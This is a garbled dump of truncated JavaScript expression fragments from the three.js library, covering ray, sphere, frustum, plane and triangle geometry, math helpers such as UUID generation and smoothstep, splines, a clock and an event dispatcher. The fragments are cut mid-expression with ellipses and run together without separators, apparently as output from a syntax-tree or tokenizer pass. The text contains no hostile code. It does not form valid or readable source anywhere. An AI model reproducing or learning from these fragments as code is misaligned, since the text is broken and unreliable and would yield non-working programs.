+ a0 ...  2 * b0s0 + a01 * s1a01 * s12 * b0s1 * (  ...  * b1 )( a01 * ...  * b1 )a01 * s ...  2 * b1a01 * s0 + s1a01 * s02 * b1s1 = segExtent;s1 = segExtents0 = Ma ...  b0) );s0 = Ma ... + b0) )Math.ma ... + b0) )- ( a01 * s1 + b0)( a01 * s1 + b0)a01 * s1 + b0- s0 *  ... 1 ) + c- s0 *  ...  * b1 )- s0 * s0- s0s1 * ( s1 + 2 * b1 )( s1 + 2 * b1 )s1 + 2 * b1s1 = - segExtent;s1 = - segExtent- segExtents1 <= - extDets0 = Ma ... b0 ) );s0 = Ma ...  b0 ) )Math.ma ...  b0 ) )- ( - a ...  + b0 )( - a01 ...  + b0 )- a01 * ... nt + b0- a01 * segExtent- a01s1 = (  ... tent );s1 = (  ... xtent )( s0 >  ... xtent )( s0 > 0 )s0 > 0Math.mi ... xtent )Math.ma ...  - b1 )- b1s0 = 0;s0 = 0s1 = Ma ... tent );s1 = Ma ... xtent )s1 * (  ... 1 ) + c- ( a01 ...  + b0 )( a01 * ...  + b0 )a01 * segExtent + b0a01 * segExtents1 = (  ... Extent;s1 = (  ... gExtent( a01 > ... gExtent( a01 > 0 )a01 > 0- ( a01 * s1 + b0 )( a01 * s1 + b0 )if ( op ... \r\n\r\n\t\t}optiona ... in ) );optiona ... gin ) )optiona ... ay.copythis.di ... rigin )this.di ... 0 ).addthis.di ... r( s0 )this.di ... yScalarthis.di ... clone()this.direction.cloneoptiona ... er ) );optiona ... ter ) )optiona ... nt.copysegDir. ... enter )segDir. ... 1 ).addsegDir. ... r( s1 )segDir. ... yScalarsegDir.clone()segDir.clonereturn sqrDist;return  ... radius;this.di ... .radiusthis.di ... enter )this.distanceToPointsphere.centersphere.radiusvar dis ... igin );distToP ... rigin )plane.d ... rigin )plane.d ... ToPointdistToPoint === 0var den ... tion );denomin ... ction )plane.n ... ction )plane.normal.dotplane.normaldenomin ... int < 0denomin ... ToPointdenominator == 0if( pla ... \n\r\n\t\t\t}plane.d ...  ) == 0var t = ... inator;t = - ( ... minator- ( thi ... minator- ( thi ... stant )( this. ... stant )this.or ... onstantthis.or ... ormal )this.origin.dotplane.constantreturn  ...   null;t >= 0 ? t :  nullt >= 0var t = ... lane );t = thi ... plane )this.di ... plane )this.distanceToPlaneif ( t  ... l;\r\n\t\t}t === null{\r\n\r\n\t\t ... l;\r\n\t\t}return  ... rget );this.at ... arget )isInter ... \n\r\n\t}(){\r\n\t\t\r\n ... }\r\n\r\n\t}var v = ... tor3();v = new ... ctor3()return  ... = null;this.in ... == nullthis.in ... ox, v )this.intersectBoxvar tmi ... ,tzmax;var inv ... tion.z;invdirx ... ction.x1/this.direction.xthis.direction.xinvdiry ... ction.y1/this.direction.ythis.direction.yinvdirz ... ction.z1/this.direction.zthis.direction.zvar ori ... origin;origin = this.originif (inv ... x;\r\n\t\t}invdirx >= 0{\r\n\t\t\t\t ... \r\n\r\n\t\t}tmin =  ... nvdirx;tmin =  ... invdirx(box.mi ... invdirx(box.mi ... igin.x)box.min.x - origin.xorigin.xtmax =  ... nvdirx;tmax =  ... invdirx(box.ma ... invdirx(box.ma ... igin.x)box.max.x - origin.x{ \r\n\r\n\t ... x;\r\n\t\t}if (inv ... y;\r\n\t\t}invdiry >= 0{\r\n\t\t\r\n ... \r\n\r\n\t\t}tymin = ... nvdiry;tymin = ... invdiry(box.mi ... invdiry(box.mi ... igin.y)box.min.y - origin.yorigin.ytymax = ... nvdiry;tymax = ... invdiry(box.ma ... invdiry(box.ma ... igin.y)box.max.y - origin.y{\r\n\r\n\t\t ... y;\r\n\t\t}if ((tm ... n null;(tmin > ... > tmax)(tmin > tymax)tmin > tymax(tymin > tmax)tymin > tmaxif (tym ...  tymin;tymin > ... == tmintymin > tmintmin !== tmintmin = tymin;tmin = tyminif (tym ...  tymax;tymax < ... == tmaxtymax < tmaxtmax !== tmaxtmax = tymax;tmax = tymaxif (inv ... z;\r\n\t\t}invdirz >= 0tzmin = ... nvdirz;tzmin = ... invdirz(box.mi ... invdirz(box.mi ... igin.z)box.min.z - origin.zorigin.ztzmax = ... nvdirz;tzmax = ... invdirz(box.ma ... invdirz(box.ma ... igin.z)box.max.z - origin.z{\r\n\r\n\t\t ... z;\r\n\t\t}(tmin > tzmax)tmin > tzmax(tzmin > tmax)tzmin > tmaxif (tzm ...  tzmin;tzmin > ... == tmintzmin > tmintmin = tzmin;tmin = tzminif (tzm ...  tzmax;tzmax < ... == tmaxtzmax < tmaxtmax = tzmax;tmax = tzmaxif ( tm ... n null;tmax < 0tmin >= ...  : tmaxtmin >= 0interse ... \t\r\n\t}()functio ... \t\r\n\t}()functio ... \r\n\t\r\n\t}{\r\n\r\n\t\t ... \r\n\t\r\n\t}var dif ... tor3();diff =  ... ctor3()var edg ... tor3();edge1 = ... ctor3()edge2 = ... ctor3()var nor ... tor3();normal  ... ctor3()return  ... \n\t\r\n\t\t}functio ... \n\t\r\n\t\t}{\r\n\r\n\t\t ... \n\t\r\n\t\t}edge1.s ... b, a );edge1.s ...  b, a )edge1.subVectorsedge2.s ... c, a );edge2.s ...  c, a )edge2.subVectorsnormal. ... dge2 );normal. ... edge2 )normal.crossVectorsvar DdN ... rmal );DdN = t ... ormal )this.di ... ormal )var sign;if ( Dd ... \n\r\n\t\t\t}DdN > 0if ( ba ... n null;sign = 1;sign = 1DdN < 0sign = - 1;sign = - 1DdN = - DdN;DdN = - DdN- DdNdiff.su ... n, a );diff.su ... in, a )diff.subVectorsvar DdQ ... e2 ) );DdQxE2  ... ge2 ) )sign *  ... ge2 ) )this.di ... ge2 ) )edge2.c ... edge2 )edge2.crossVectorsDdQxE2 < 0var DdE ... ff ) );DdE1xQ  ... iff ) )sign *  ... iff ) )this.di ... iff ) )edge1.cross( diff )edge1.crossDdE1xQ < 0DdQxE2  ... Q > DdNDdQxE2 + DdE1xQvar QdN ... rmal );QdN = - ... ormal )- sign  ... ormal )- signdiff.dot( normal )if ( Qd ... \n\r\n\t\t\t}QdN < 0QdN / DdNapplyMa ... is;\r\n\t}this.di ... rix4 );this.di ... trix4 )this.di ... Matrix4this.direction.addthis.or ... rix4 );this.or ... trix4 )this.or ... Matrix4this.di ... igin );this.direction.subthis.di ... lize();this.di ... alize()this.di ... rmalizereturn  ... tion );ray.ori ... ction )ray.ori ... rigin )ray.origin.equalsray.dir ... ction )ray.direction.equalsnew THREE.Ray().copynew THREE.Ray()THREE.S ... 0;\r\n\r\n}this.ce ... tor3();this.ce ... ctor3()( cente ... ctor3()( cente ... fined )center !== undefinedthis.ra ... us : 0;this.ra ... ius : 0this.radius( radiu ... ius : 0( radiu ... fined )radius !== undefinedconstru ... .Sphereset: fu ... is;\r\n\t}this.ce ... nter );this.ce ... enter )this.center.copythis.ra ... radius;this.radius = radiusvar box ... Box3();box = n ... .Box3()return  ... \r\n \t\t};functio ... \t\r\n \t\t}{\r\n\r\n\t\t ... \t\r\n \t\t}var cen ... center;center = this.centerif ( op ... \n\r\n\t\t\t}optiona ... definedcenter. ... nter );center. ... enter )center.copybox.set ... nter );box.set ... enter )box.set ... .centerbox.set ... oints )box.setFromPointsvar maxRadiusSq = 0;maxRadiusSq = 0maxRadi ...  ] ) );maxRadi ... i ] ) )Math.ma ... i ] ) )center. ... [ i ] )center. ... Squaredthis.ra ... usSq );this.ra ... iusSq )Math.sq ... iusSq )this.ra ... .radiusreturn  ... <= 0 );( this.radius <= 0 )this.radius <= 0return  ... us ) );( point ... ius ) )point.d ... adius )point.d ... enter )point.d ... Squared( this. ... adius )return  ... dius );( point ... adius )point.d ... .radiuspoint.distanceTovar rad ... radius;radiusS ... .radiusreturn  ... sSum );sphere. ... usSum )sphere. ... enter )sphere. ... Squared( radiu ... usSum )radiusS ... diusSumvar del ... oint );deltaLe ... point )this.ce ... point )this.ce ... Squaredresult. ... oint );deltaLe ... adius )result. ... lize();result. ... alize()result. ... rmalizeresult. ... enter )result.subresult. ... nter );result. ... s ).addresult. ... adius )getBoun ... ;\r\n\r\n\t}box = o ... .Box3()optiona ... .Box3()box.setbox.exp ... dius );box.exp ... adius )box.expandByScalarreturn box;this.ce ... trix );this.ce ... atrix )this.ce ... Matrix4this.ra ... Axis();this.ra ... nAxis()matrix. ... nAxis()matrix. ... eOnAxisthis.ce ... fset );this.ce ... ffset )this.center.addsphere. ... adius )sphere.center.equals( spher ... adius )sphere. ... .radiusTHREE.F ... ;\r\n\r\n};THREE.F ... ];\r\n\r\n}THREE.Frustumfunctio ... ];\r\n\r\n}{\r\n\r\n\tt ... ];\r\n\r\n}this.pl ... \r\n\r\n\t];this.pl ... )\r\n\r\n\t]this.planes[\r\n\r\n\t\t ... )\r\n\r\n\t]( p0 != ... Plane()( p0 !== undefined )p0 !== undefinednew THREE.Plane()THREE.Plane( p1 != ... Plane()( p1 !== undefined )p1 !== undefined( p2 != ... Plane()( p2 !== undefined )p2 !== undefined( p3 != ... Plane()( p3 !== undefined )p3 !== undefined( p4 != ... Plane()( p4 !== undefined )p4 !== undefined( p5 != ... Plane()( p5 !== undefined )p5 !== undefinedTHREE.F ... }\r\n\r\n};THREE.F ... \t}\r\n\r\n}THREE.F ... ototypeconstru ... Frustumvar pla ... planes;planes = this.planesplanes[ ... ( p0 );planes[0].copy( p0 )planes[0].copyplanes[0]planes[ ... ( p1 );planes[1].copy( p1 )planes[1].copyplanes[1]planes[ ... ( p2 );planes[2].copy( p2 )planes[2].copyplanes[2]planes[ ... ( p3 );planes[3].copy( p3 )planes[3].copyplanes[3]planes[ ... ( p4 );planes[4].copy( p4 )planes[4].copyplanes[4]planes[ ... ( p5 );planes[5].copy( p5 )planes[5].copyplanes[5]for( va ... \r\n\r\n\t\t}i < 6var i = 0planes[ ... s[i] );planes[ ... es[i] )planes[i].copyplanes[i]frustum.planes[i]frustum.planesvar me0 ...  me[3];me0 = me[0]me1 = me[1]me2 = me[2]me3 = me[3]var me4 ...  me[7];me4 = me[4]me5 = me[5]me6 = me[6]me7 = me[7]var me8 ... me[11];me8 = me[8]me9 = me[9]me10 = me[10]me11 = me[11]var me1 ... me[15];me12 = me[12]me13 = me[13]me14 = me[14]me15 = me[15]planes[ ... lize();planes[ ... alize()planes[ ... rmalizeplanes[ ...  me12 )planes[ ... ponentsplanes[ 0 ]me3 - me0me7 - me4me11 - me8me15 - me12planes[ 1 ]me3 + me0me7 + me4me11 + me8me15 + me12planes[ ...  me13 )planes[ 2 ]me3 + me1me7 + me5me11 + me9me15 + me13planes[ 3 ]me3 - me1me7 - me5me11 - me9me15 - me13planes[ ...  me14 )planes[ 4 ]me3 - me2me7 - me6me11 - me10me15 - me14planes[ 5 ]me3 + me2me7 + me6me11 + me10me15 + me14interse ... \n\r\n\t}()var sph ... here();sphere  ... phere()var geo ... ometry;geometr ... eometryobject.geometryif ( ge ... here();geometr ... == nullgeometr ... gSpheregeometr ... here();geometr ... phere()compute ... gSpheresphere. ... here );sphere. ... phere )sphere.copysphere. ... orld );sphere. ... World )sphere.applyMatrix4object.matrixWorldreturn  ... here );this.in ... phere )this.in ... sSpherecenter  ... .centervar neg ... radius;negRadi ... .radius-sphere.radiusfor ( v ... \r\n\r\n\t\t}var dis ... nter );distanc ... enter )planes[ ... enter )planes[ ... ToPointplanes[ i ]distance < negRadiusvar p1  ... tor3();p1 = ne ... ctor3()p2 = ne ... ctor3()return  ... ;\r\n\t\t};functio ... e;\r\n\t\t}{\r\n\r\n\t\t ... e;\r\n\t\t}for ( v ... }\r\n\t\t\t}{\r\n\t\t\t\r ... }\r\n\t\t\t}var pla ... nes[i];plane = planes[i]p1.x =  ... .max.x;p1.x =  ... x.max.xp1.xplane.n ... x.max.xplane.normal.x > 0plane.normal.xp2.x =  ... .min.x;p2.x =  ... x.min.xp2.xplane.n ... x.min.xp1.y =  ... .max.y;p1.y =  ... x.max.yp1.yplane.n ... x.max.yplane.normal.y > 0plane.normal.yp2.y =  ... .min.y;p2.y =  ... x.min.yp2.yplane.n ... x.min.yp1.z =  ... .max.z;p1.z =  ... x.max.zp1.zplane.n ... x.max.zplane.normal.z > 0plane.normal.zp2.z =  ... .min.z;p2.z =  ... x.min.zp2.zplane.n ... x.min.zvar d1  ... ( p1 );d1 = pl ... t( p1 )plane.d ... t( p1 )var d2  ... ( p2 );d2 = pl ... t( p2 )plane.d ... t( p2 )if ( d1 ... \r\n\t\t\t\t}d1 < 0 && d2 < 0d1 < 0d2 < 0{\r\n\t\t\t\t ... \r\n\t\t\t\t}if ( pl ... \n\r\n\t\t\t}planes[ ... t ) < 0planes[ ... point )new THREE.Frustum()THREE.P ... ;\r\n\r\n};THREE.P ... 0;\r\n\r\n}this.no ... 0, 0 );this.no ...  0, 0 )this.normal( norma ...  0, 0 )( norma ... fined )normal !== undefinednew THR ...  0, 0 )this.co ... nt : 0;this.co ... ant : 0this.constant( const ... ant : 0( const ... fined )constan ... definedTHREE.P ... }\r\n\r\n};THREE.P ... \t}\r\n\r\n}THREE.P ... ototypeconstru ... E.Planethis.no ... rmal );this.no ... ormal )this.normal.copythis.co ... nstant;this.co ... onstantsetComp ... ;\r\n\r\n\t}this.no ... y, z );this.no ...  y, z )this.normal.setthis.constant = w;this.constant = wsetFrom ... arPointthis.co ... rmal );this.co ... ormal )- point ... ormal )point.d ... ormal )point.dotsetFrom ... rPointsvar v2  ... tor3();v2 = ne ... ctor3()var nor ... lize();normal  ... alize()v1.subV ... alize()v1.subV ... rmalizev1.subV ... , b ) )v1.subV ... ).crossv1.subV ...  c, b )v2.subV ...  a, b )v2.subVectorsthis.se ... l, a );this.se ... al, a )this.se ... arPointvar inv ... ngth();inverse ... ength()1.0 / t ... ength()this.normal.length()this.normal.lengththis.no ... ngth );this.no ... ength )this.no ... yScalarthis.co ... Length;this.co ... lLengththis.constant *= -1;this.constant *= -1this.no ... gate();this.normal.negate()this.normal.negatereturn  ... nstant;this.no ... onstantthis.no ... point )this.normal.dotproject ... ;\r\n\r\n\t}return  ... gate();this.or ... egate()this.or ... .negatethis.or ... t ).subthis.or ... arget )this.orthoPointorthoPo ... ;\r\n\r\n\t}var per ... oint );perpend ... point )perpend ... gnitudethis.di ... point )return  ... tude );result. ... itude )result. ... ormal )var sta ... tart );startSi ... start )this.di ... start )var end ... .end );endSign ... e.end )this.di ... e.end )return  ...  > 0 );( start ... n > 0 )startSi ... ign > 0startSign < 0endSign > 0( endSi ... n > 0 )endSign ... ign > 0endSign < 0startSign > 0var dir ... ( v1 );directi ... a( v1 )line.delta( v1 )line.deltathis.no ... ction )if ( de ... \n\r\n\t\t\t}if( thi ... \r\n\t\t\t\t}this.di ...  ) == 0return undefined;- ( lin ... minator- ( lin ... stant )( line. ... stant )line.st ... onstantline.st ... ormal )line.start.dotif( t < ... \n\r\n\t\t\t}t < 0 || t > 1coplana ... ;\r\n\r\n\t}return  ... tant );result. ... stant )- this.constantvar m1  ... rix3();m1 = ne ... trix3()new THREE.Matrix3()var nor ... trix );normalM ... atrix )optiona ... atrix )m1.getN ... atrix )m1.getNormalMatrixvar new ... trix );newNorm ... atrix )v1.copy ... atrix )v1.copy ... Matrix3var new ... ( v2 );newCopl ... t( v2 )this.co ... t( v2 )this.coplanarPointnewCopl ... trix );newCopl ... atrix )newCopl ... Matrix4this.se ... oint );this.se ... Point )offset. ... ormal )offset.dotplane.n ... stant )plane.n ... ormal )plane.normal.equals( plane ... stant )plane.c ... onstant{\r\n\r\n\tg ... \t}\r\n\r\n}generat ... \n\r\n\t}()var cha ... it('');chars = ... lit('')'012345 ... lit('')'012345 ... '.split'012345 ... uvwxyz'0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzvar uui ... ay(36);uuid = new Array(36)new Array(36)var rnd = 0, r;rnd = 0i < 36{\r\n\r\n\t\t ... }\r\n\t\t\t}if ( i  ... \r\n\t\t\t\t}i == 8  ... i == 23i == 8  ... i == 18i == 8 || i == 13i == 8i == 13i == 18i == 23{\r\n\t\t\t\r ... \r\n\t\t\t\t}uuid[ i ] = '-';uuid[ i ] = '-'uuid[ i ]i == 14uuid[ i ] = '4';uuid[ i ] = '4'if (rnd ... 000)|0;rnd <= 0x02rnd = 0 ... 000)|0;rnd = 0 ... 0000)|00x20000 ... 0000)|00x20000 ... 000000)33554432(Math.r ... 000000)Math.ra ... 100000016777216r = rnd & 0xf;r = rnd & 0xfrnd & 0xfrnd = rnd >> 4;rnd = rnd >> 4rnd >> 4uuid[i] ... 8 : r];uuid[i] ... x8 : r]uuid[i]chars[( ... x8 : r](i == 1 ... 0x8 : r(i == 19)i == 19(r & 0x3) | 0x8(r & 0x3)r & 0x3return  ... in('');uuid.join('')uuid.joinreturn  ...  : x );( x < a ... b : x )( x < a )x < a( ( x > ... b : x )( x > b ) ? b : x( x > b )x > bclampBo ... ;\r\n\r\n\t}return  ...  a : x;x < a ? a : xmapLine ... ;\r\n\r\n\t}return  ... - a1 );b1 + (  ...  - a1 )( x - a ...  - a1 )( x - a ...  - b1 )( x - a1 )x - a1( b2 - b1 )b2 - b1( a2 - a1 )a2 - a1smooths ... ;\r\n\r\n\t}if ( x  ... turn 0;x <= minif ( x  ... turn 1;x >= maxreturn 1;x = ( x ...  min );x = ( x ... - min )( x - m ... - min )( x - min )x - min( max - min )return  ... - 2*x);x*x*(3 - 2*x)x*x(3 - 2*x)3 - 2*x2*xsmoothe ... ;\r\n\r\n\t}return  ...  + 10);x*x*x*( ... ) + 10)x*x*x(x*(x*6 - 15) + 10)x*(x*6 - 15) + 10x*(x*6 - 15)(x*6 - 15)x*6 - 15x*6random1 ... ;\r\n\r\n\t}return  ...  65535;( 65280 ... / 65535( 65280 ... dom() )65280 * ... andom()255 * Math.random()randInt ... ;\r\n\r\n\t}low + M ... + 1 ) )Math.fl ... + 1 ) )Math.ra ... w + 1 )( high - low + 1 )high - low + 1high - lowrandFlo ... ;\r\n\r\n\t}return  ...  low );low + M ... - low )Math.ra ... - low )( high - low )return  ... om() );range * ... dom() )( 0.5 - ... dom() )0.5 - Math.random()sign: f ... ;\r\n\r\n\t}return  ...  1 : 0;( x < 0 ... ? 1 : 0( x < 0 )x < 0( x > 0 ) ? 1 : 0( x > 0 )x > 0degToRa ... \n\r\n\t}()var deg ...  / 180;degreeT ... I / 180degreeT ... sFactorMath.PI / 180return  ... Factor;degrees ... sFactorradToDe ... \n\r\n\t}()var rad ... ath.PI;radianT ... Math.PIradianT ... sFactor180 / Math.PIradians ... sFactorisPower ... ;\r\n\r\n\t}return  ...  !== 0;( value ... e !== 0( value ... ) === 0( value ... - 1 ) )value & ... e - 1 )( value - 1 )value - 1value !== 0THREE.S ... };\r\n\r\n}THREE.Splinefunctio ... };\r\n\r\n}{\r\n\r\n\tt ... };\r\n\r\n}this.po ... points;this.points = pointsthis.pointsvar c = ... pc, pd;c = []v3 = {  ...  z: 0 }{ x: 0, y: 0, z: 0 }x: 0y: 0z: 0this.in ... \r\n\r\n\t};this.in ... }\r\n\r\n\t}this.initFromArraythis.points = [];this.points = []i < a.lengtha.lengththis.po ...  2 ] };this.po ... [ 2 ] }this.points[ i ]{ x: a[ ... [ 2 ] }x: a[ i ][ 0 ]a[ i ][ 0 ]a[ i ]y: a[ i ][ 1 ]a[ i ][ 1 ]z: a[ i ][ 2 ]a[ i ][ 2 ]this.ge ... \r\n\r\n\t};this.ge ... ;\r\n\r\n\t}this.getPointpoint = ...  ) * k;point = ... 1 ) * k( this. ... 1 ) * k( this. ... h - 1 )this.po ... gth - 1this.points.lengthintPoin ... oint );intPoin ... point )Math.floor( point )weight  ... tPoint;weight  ... ntPointpoint - intPointc[ 0 ]  ... nt - 1;c[ 0 ]  ... int - 1c[ 0 ]intPoin ... int - 1intPoint === 0intPoint - 1c[ 1 ] = intPoint;c[ 1 ] = intPointc[ 1 ]c[ 2 ]  ... nt + 1;c[ 2 ]  ... int + 1c[ 2 ]intPoin ... int + 1intPoin ... gth - 2this.po ... gth - 2intPoint + 1c[ 3 ]  ... nt + 2;c[ 3 ]  ... int + 2c[ 3 ]intPoin ... int + 2intPoin ... gth - 3this.po ... gth - 3intPoint + 2pa = th ...  0 ] ];pa = th ... [ 0 ] ]this.po ... [ 0 ] ]pb = th ...  1 ] ];pb = th ... [ 1 ] ]this.po ... [ 1 ] ]pc = th ...  2 ] ];pc = th ... [ 2 ] ]this.po ... [ 2 ] ]pd = th ...  3 ] ];pd = th ... [ 3 ] ]this.po ... [ 3 ] ]w2 = we ... weight;w2 = weight * weightweight * weightw3 = weight * w2;w3 = weight * w2weight * w2v3.x =  ... , w3 );v3.x =  ... 2, w3 )v3.xinterpo ... 2, w3 )pa.xpb.xpc.xpd.xv3.y =  ... , w3 );v3.y =  ... 2, w3 )v3.ypa.ypb.ypc.ypd.yv3.z =  ... , w3 );v3.z =  ... 2, w3 )v3.zpa.zpb.zpc.zpd.zreturn v3;this.ge ... tsArraygetCont ... tsArrayvar i,  ... s = [];l = thi ... .lengthcoords = []i < lp = thi ... s[ i ];p = this.points[ i ]coords[ ...  p.z ];coords[ ... , p.z ]coords[ i ][ p.x, p.y, p.z ]p.xp.yp.zreturn coords;this.getLengthvar i,  ... th = 0;point = 0intPoint = 0oldIntPoint = 0oldPosi ... ctor3()tmpVec  ... ctor3()chunkLengths = []totalLength = 0chunkLe ...  ] = 0;chunkLe ... 0 ] = 0chunkLengths[ 0 ]if ( !n ...  = 100;!nSubDivisionsnSubDivisions = 100;nSubDivisions = 100nSample ... isions;nSample ... visionsthis.po ... visionsoldPosi ...  0 ] );oldPosi ... [ 0 ] )oldPosition.copythis.points[ 0 ]i < nSamplesindex = ... amples;index = i / nSamplesi / nSamplespositio ... ndex );positio ... index )this.ge ... index )tmpVec. ... tion );tmpVec. ... ition )tmpVec.copytotalLe ... tion );totalLe ... ition )tmpVec.distanceTooldPosi ... tion );oldPosi ... ition )point = ...  index;point = ... * index( this. ... * indexif ( in ... \n\r\n\t\t\t}intPoin ... ntPointchunkLe ... Length;chunkLe ... lLengthchunkLe ... Point ]oldIntP ... tPoint;oldIntP ... ntPointchunkLe ... ength ]chunkLengths.lengthreturn  ... ngth };{ chunk ... ength }chunks: chunkLengthstotal: totalLengththis.re ... \r\n\r\n\t};this.re ... ;\r\n\r\n\t}this.re ... cLengthreparam ... cLengthvar i,  ... ngth();newpoints = []sl = th ... ength()this.getLength()newpoin ... ne() );newpoin ... one() )newpoints.pushtmpVec. ... clone()tmpVec. ... ).clonetmpVec. ... [ 0 ] )i < thi ... .lengthrealDis ...  - 1 ];realDis ... i - 1 ]sl.chun ... i - 1 ]sl.chunks[ i ]sl.chunkssl.chunks[ i - 1 ]i - 1samplin ... otal );samplin ... total )Math.ce ... total )samplin ... l.totalsamplin ... istancesl.totalindexCu ...  - 1 );indexCu ... h - 1 )( i - 1 ... h - 1 )( i - 1 )indexNe ...  - 1 );indexNe ... h - 1 )i / ( t ... h - 1 )for ( j ... \n\r\n\t\t\t}j < sampling - 1sampling - 1j++j = 1index = ... rent );index = ... rrent )indexCu ... rrent )j * ( 1 ... rrent )j * ( 1 / sampling )( 1 / sampling )1 / sampling( index ... rrent )indexNe ... CurrenttmpVec. ... [ i ] )this.po ... wpointsvar v0  ...  * 0.5;v0 = (  ... ) * 0.5( p2 - p0 ) * 0.5( p2 - p0 )p2 - p0v1 = (  ... ) * 0.5( p3 - p1 ) * 0.5( p3 - p1 )p3 - p1return  ... t + p1;( 2 * ( ...  t + p1( 2 * ( ...  v0 * t( 2 * ( ...  ) * t2( 2 * ( ...  ) * t3( 2 * ( ...  + v1 )2 * ( p ... v0 + v12 * ( p1 - p2 ) + v02 * ( p1 - p2 )( p1 - p2 )p1 - p2( - 3 * ...  ) * t2( - 3 * ...  - v1 )- 3 * ( ... v0 - v1- 3 * ( ...  2 * v0- 3 * ( p1 - p2 )- 32 * v0v0 * tTHREE.T ... ;\r\n\r\n};THREE.T ... );\r\n\r\n}THREE.Trianglethis.a  ... tor3();this.a  ... ctor3()this.a( a !== ... ctor3()( a !== undefined )a !== undefinedthis.b  ... tor3();this.b  ... ctor3()( b !== ... ctor3()( b !== undefined )b !== undefinedthis.c  ... tor3();this.c  ... ctor3()this.c( c !== ... ctor3()( c !== undefined )c !== undefinedTHREE.T ... \n\r\n}();THREE.T ... \r\n\r\n}()THREE.T ... .normal{\r\n\r\n\tv ... };\r\n\r\n}var v0  ... tor3();v0 = ne ... ctor3()return  ... \r\n\r\n\t};result. ... c, b );result. ...  c, b )v0.subV ... a, b );v0.subV ...  a, b )v0.subVectorsresult.cross( v0 );result.cross( v0 )result.crossvar res ... thSq();resultL ... gthSq()result.lengthSq()result.lengthSqif( res ... \r\n\r\n\t\t}resultLengthSq > 0return  ... Sq ) );result. ... hSq ) )1 / Mat ... gthSq )Math.sq ... gthSq )return  ... 0, 0 );result. ...  0, 0 )THREE.T ... omPointv0.subV ... c, a );v0.subV ...  c, a )v1.subV ... b, a );v1.subV ...  b, a )v2.subV ... t, a );v2.subV ... nt, a )var dot ... ( v0 );dot00 = v0.dot( v0 )v0.dot( v0 )v0.dotvar dot ... ( v1 );dot01 = v0.dot( v1 )v0.dot( v1 )var dot ... ( v2 );dot02 = v0.dot( v2 )v0.dot( v2 )dot11 = v1.dot( v1 )v1.dot( v1 )v1.dotdot12 = v1.dot( v2 )v1.dot( v2 )var den ... ot01 );denom = ... dot01 )( dot00 ... dot01 )dot00 * ... * dot01dot00 * dot11dot01 * dot01if( den ... );\r\n\t\t}denom == 0{\r\n\t\t\t/ ... );\r\n\t\t}return  ... , -1 );result. ... 1, -1 )var inv ...  denom;invDenom = 1 / denom1 / denomvar u = ... vDenom;u = ( d ... nvDenom( dot11 ... nvDenom( dot11 ... dot12 )dot11 * ... * dot12dot11 * dot02dot01 * dot12var v = ... vDenom;v = ( d ... nvDenom( dot00 ... nvDenom( dot00 ... dot02 )dot00 * ... * dot02dot00 * dot12dot01 * dot02return  ... v, u );result. ...  v, u )1 - u - v1 - uTHREE.T ... nsPointvar res ... , v1 );result  ... c, v1 )THREE.T ... c, v1 )return  ... <= 1 );( resul ...  <= 1 )( resul ...  >= 0 )( result.x >= 0 )result.x >= 0result.x( result.y >= 0 )result.y >= 0result.y( ( res ...  <= 1 )( resul ...  ) <= 1( resul ... ult.y )result.x + result.yTHREE.T ... }\r\n\r\n};THREE.T ... \t}\r\n\r\n}THREE.T ... ototypeconstru ... rianglethis.a.copy( a );this.a.copy( a )this.a.copythis.b.copy( b );this.b.copy( b )this.b.copythis.c.copy( c );this.c.copy( c )this.c.copysetFrom ... Indicesthis.a. ... [i0] );this.a. ... s[i0] )points[i0]this.b. ... [i1] );this.b. ... s[i1] )points[i1]this.c. ... [i2] );this.c. ... s[i2] )points[i2]this.a. ... le.a );this.a. ... gle.a )triangle.athis.b. ... le.b );this.b. ... gle.b )triangle.bthis.c. ... le.c );this.c. ... gle.c )triangle.carea: f ... \n\r\n\t}()v0.subV ... is.b );v0.subV ... his.b )v1.subV ... is.b );v1.subV ... his.b )return  ...  * 0.5;v0.cros ... ) * 0.5v0.cros ... ength()v0.cros ... .lengthv0.cross( v1 )v0.crossmidpoin ... ;\r\n\r\n\t}return  ...  / 3 );result. ... 1 / 3 )result. ... his.c )result. ... b ).addresult. ... his.b )normal: ... ;\r\n\r\n\t}THREE.T ... arget )plane:  ... ;\r\n\r\n\t}var res ... lane();result  ... Plane()optiona ... Plane()return  ... is.c );result. ... rPointsbarycoo ... ;\r\n\r\n\t}THREE.T ... his.c )triangl ... his.c )triangl ... his.b )triangl ... his.a )triangle.a.equalstriangle.b.equalstriangle.c.equalsnew THREE.Triangle()THREE.V ... v;\r\n\r\n}THREE.Vertexfunctio ... v;\r\n\r\n}{\r\n\r\n\tc ... v;\r\n\r\n}console ... tead.')'THREE. ... stead.'THREE.Vertex has been DEPRECATED. Use THREE.Vector3 instead.Vertex has been DEPRECATED Use THREEVector3 insteadreturn v;THREE.Clockthis.au ... : true;this.au ...  : truethis.autoStart( autoS ...  : true( autoS ... fined )autoSta ... definedthis.startTime = 0;this.startTime = 0this.startTimethis.oldTime = 0;this.oldTime = 0this.oldTimethis.el ... me = 0;this.elapsedTime = 0this.elapsedTimethis.ru ...  false;this.running = falsethis.runningconstru ... E.Clockstart:  ... ue;\r\n\t}functio ... ue;\r\n\t}{\r\n\r\n\t\t ... ue;\r\n\t}this.st ... .now();this.st ... e.now()self.pe ... e.now()self.pe ... definedself.performanceself.performance.nowthis.ol ... rtTime;this.ol ... artTimethis.running = true;this.running = truestop: f ... ;\r\n\r\n\t}this.ge ... Time();this.ge ... dTime()this.getElapsedTimegetElap ... ;\r\n\r\n\t}this.getDelta();this.getDelta()this.getDeltareturn  ... edTime;getDelt ... ;\r\n\r\n\t}var diff = 0;diff = 0this.au ... running! this.runningthis.start();this.start()var new ... .now();newTime ... e.now()diff =  ... Time );diff =  ... dTime )0.001 * ... dTime )( newTi ... dTime )newTime ... oldTimethis.ol ... ewTime;this.ol ... newTimethis.el ... = diff;this.el ... += diffreturn diff;THREE.E ... n () {}constru ... patcherapply:  ... ;\r\n\r\n\t}object. ... stener;object. ... istenerTHREE.E ... istenerobject. ... hEvent;object. ... chEventobject.dispatchEventTHREE.E ... chEventaddEven ... }\r\n\r\n\t}if ( th ... s = {};this._l ... definedthis._listenersthis._l ... s = {};this._listeners = {}var lis ... teners;listene ... stenersif ( li ... \r\n\r\n\t\t}listene ... definedlisteners[ type ]listene ... ] = [];listene ...  ] = []listene ... === - 1listene ... tener )listene ... indexOflistene ... ener );listene ...  ].pushhasEven ... ;\r\n\r\n\t}if ( th ...  false;listene ... !== - 1removeE ... }\r\n\r\n\t}if ( th ... return;var lis ... type ];listene ...  type ]var ind ... ener );index = ... tener )index !== - 